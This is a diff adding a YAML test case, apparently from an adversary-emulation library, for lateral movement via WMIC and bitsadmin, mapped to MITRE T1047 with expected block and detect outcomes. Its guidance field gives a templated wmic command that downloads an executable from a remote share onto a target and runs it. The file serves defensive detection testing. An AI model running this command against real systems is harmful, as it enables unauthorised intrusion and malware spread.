@@ -1,0 +1,33 @@
+block:
+- Suspicious process execution/behavior is blocked by EDR or other endpoint security
+  tool
+- Payload on disk deleted/quarantined by antivirus or other endpoint security tool
+controls:
+- EDR
+- Antivirus
+- UEBA
+description: Using wmic.exe, execute a command on a remote system that will download
+  and execute an executable payload hosted on a share.
+detect:
+- Suspicious process execution/behavior is detected by EDR or other endpoint security
+  tool, or alerted in SIEM based on process creation events
+- Payload on disk triggers an alert in EDR or other endpoint security tool
+- Logons with suspicious characteristics (e.g. first logon, anomalous logon time,
+  non-standard authentication package) generate alerts in the SIEM or UEBA
+guidance:
+- cmd> wmic.exe /node:"{{ target }}" process call create "cmd.exe /c bitsadmin /transfer
+  vVv \\{{ share_host }}\{{ share_name }}$\vVv.exe %APPDATA%\vVv.exe & %APPDATA%\vVv.exe"
+logs:
+- process_create
+metadata:
+  groups:
+  - Wizard Spider
+  - APT29
+  isv: 1
+  tactic: TA0008
+  tid: T1047
+name: Lateral Movement via WMIC and Bitsadmin
+platforms:
+- windows
+prerequisites:
+- logon_rights
